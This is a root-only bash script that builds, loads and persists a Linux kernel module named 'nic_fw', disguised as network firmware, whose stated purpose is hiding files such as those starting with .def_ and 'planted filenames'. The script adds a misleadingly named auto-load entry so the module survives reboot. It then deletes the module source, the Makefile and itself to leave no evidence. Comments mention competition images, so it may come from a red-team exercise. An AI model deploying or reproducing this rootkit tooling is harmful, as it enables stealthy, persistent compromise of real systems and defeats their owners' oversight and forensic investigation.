#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

KVER="$(uname -r)"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KDIR="/lib/modules/${KVER}/build"

install_headers() {
    if [[ -d "$KDIR" ]]; then
        return 0
    fi
    echo "[*] Kernel headers not found — installing..."
    if command -v apt-get &>/dev/null; then
        # Disable cdrom source that blocks installs on DVD-provisioned machines.
        sed -i 's|^deb cdrom:|#deb cdrom:|g' /etc/apt/sources.list 2>/dev/null || true

        # Ensure standard Debian network repos are present.  Many competition
        # images ship with only the cdrom source, so the exact kernel headers
        # package (linux-headers-X.Y.Z-N-amd64) is never found without this.
        local codename
        codename=$(. /etc/os-release 2>/dev/null && printf '%s' "${VERSION_CODENAME:-bookworm}")
        local src_file="/etc/apt/sources.list.d/debian-rt-main.list"
        if ! grep -rqE "deb.debian.org/debian[[:space:]]+${codename}[[:space:]]+main" \
                /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null; then
            echo "[*] Adding Debian ${codename} main/updates/security repos..."
            cat > "${src_file}" <<EOF
deb http://deb.debian.org/debian ${codename} main
deb http://deb.debian.org/debian ${codename}-updates main
deb http://security.debian.org/debian-security ${codename}-security main
EOF
        fi

        DEBIAN_FRONTEND=noninteractive apt-get update -q
        # Install the exact running-kernel headers first; no fallback to a
        # generic meta-package (which installs headers for a DIFFERENT kernel
        # version and leaves /lib/modules/${KVER}/build missing).
        DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
            "linux-headers-${KVER}" build-essential
    elif command -v dnf &>/dev/null; then
        # Try exact running-kernel version first; repo may have rolled forward,
        # so fall back to unversioned kernel-devel (latest available).
        # elfutils-libelf-devel is required for kernel module builds on Rocky 9+.
        dnf install -y "kernel-devel-${KVER}" gcc make elfutils-libelf-devel 2>/dev/null || \
            dnf install -y kernel-devel gcc make elfutils-libelf-devel
    elif command -v yum &>/dev/null; then
        yum install -y "kernel-devel-${KVER}" gcc make 2>/dev/null || \
            yum install -y kernel-devel gcc make
    else
        echo "[!] Unknown package manager — cannot install kernel headers"
        exit 1
    fi
    if [[ ! -d "$KDIR" ]]; then
        echo "[!] ${KDIR} still missing after install"
        echo "[!]   Running kernel : ${KVER}"
        echo "[!]   Package linux-headers-${KVER} may not exist in any configured repo"
        echo "[!]   Skipping LKM — continuing without file-hiding module"
        return 1
    fi
    echo "[+] Kernel headers ready"
}

case "${1:-deploy}" in
  deploy)
    install_headers

    echo "[*] Building module for kernel ${KVER}..."
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    make -C "$DIR" KVER="$KVER"

    # Update persistent copy BEFORE loading — reboot gets the new version even if insmod fails
    EXTRA_DIR="/lib/modules/${KVER}/extra"
    mkdir -p "$EXTRA_DIR"
    cp "${DIR}/nic_fw.ko" "${EXTRA_DIR}/nic_fw.ko"
    depmod -a 2>/dev/null || true
    echo "nic_fw" > /etc/modules-load.d/net-fw.conf

    # Unload any existing version first; fails silently if hidden from module list
    rmmod nic_fw 2>/dev/null || true

    echo "[*] Loading module..."
    if insmod "${DIR}/nic_fw.ko"; then
        echo "[+] lkm/load: module loaded"
    else
        echo "[!] lkm/load: insmod failed — module may already be running"
        echo "[!]   Persistent copy updated: ${EXTRA_DIR}/nic_fw.ko"
        echo "[!]   Reboot to activate the updated module"
    fi
    echo "[+]   Hides: files starting with .def_ and planted filenames"
    echo "[+]   Auto-load on reboot: /etc/modules-load.d/net-fw.conf"

    # Wipe source and build artifacts — no evidence of what was compiled
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    rm -f "${DIR}/nic_fw.c" "${DIR}/Makefile"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    rmmod nic_fw 2>/dev/null || echo "[!] rmmod failed — may need: rmmod nic_fw manually"
    rm -f "/lib/modules/${KVER}/extra/nic_fw.ko"
    rm -f /etc/modules-load.d/net-fw.conf
    depmod -a 2>/dev/null || true
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    echo "[-] lkm/load: module unloaded"
    ;;
  *) echo "Usage: $0 [deploy|cleanup]"; exit 1 ;;
esac
